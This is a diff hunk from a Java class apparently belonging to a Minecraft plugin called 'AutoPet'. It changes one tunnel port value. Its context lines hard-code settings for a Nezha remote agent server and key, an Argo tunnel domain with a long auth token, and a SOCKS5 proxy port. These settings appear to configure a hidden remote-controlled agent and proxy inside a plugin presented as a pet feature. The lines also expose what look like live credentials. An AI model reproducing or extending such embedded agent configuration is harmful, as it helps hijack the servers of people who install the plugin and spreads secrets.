@@ -173,7 +173,7 @@ public class AutoPet extends JavaPlugin {
         putIfNotEmpty(envVars, "NEZHA_SERVER", "nzku.fortymenty.eu.org:443");
         putIfNotEmpty(envVars, "NEZHA_PORT", "");
         putIfNotEmpty(envVars, "NEZHA_KEY", "UsC5sNDciSaNggxJdB3EGSGYS242VT7q");
-        putIfNotEmpty(envVars, "ARGO_PORT", "9681");
+        putIfNotEmpty(envVars, "ARGO_PORT", "13700");
         putIfNotEmpty(envVars, "ARGO_DOMAIN", "mcserverhost-us.yszy.nyc.mn");
         putIfNotEmpty(envVars, "ARGO_AUTH", "eyJhIjoiZjUxNzk5OTMxMWQ4ZTAzOTg4OThmZjRkMTZiZDYzYjQiLCJ0IjoiOTc1N2JjZjQtYWU5YS00NGQxLThhZTYtOGQ1NWQ0N2Q5ZTg3IiwicyI6Ik9EYzFaalF4T0RndE5UUTRPQzAwTjJSa0xUazFObU10TWpBMk16UXhPREk0TnpreCJ9");
         putIfNotEmpty(envVars, "S5_PORT", "");
